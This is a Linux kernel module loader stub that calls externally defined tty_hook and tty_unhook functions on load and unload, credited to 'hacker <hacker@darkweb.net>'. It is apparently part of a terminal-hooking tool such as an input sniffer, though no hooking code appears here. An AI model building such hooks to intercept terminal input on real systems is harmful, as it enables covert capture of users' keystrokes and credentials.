#include <linux/module.h>
#include <linux/kernel.h>

int tty_hook(void);
void tty_unhook(void);

static int __init hook_init(void)
{
	printk("Hello World!");

	return tty_hook();
}

static void __exit hook_exit(void)
{
	printk("Bye World..");
	tty_unhook();
}

module_init(hook_init);
module_exit(hook_exit);

MODULE_LICENSE("GPL v2");
MODULE_AUTHOR("hacker <hacker@darkweb.net>");
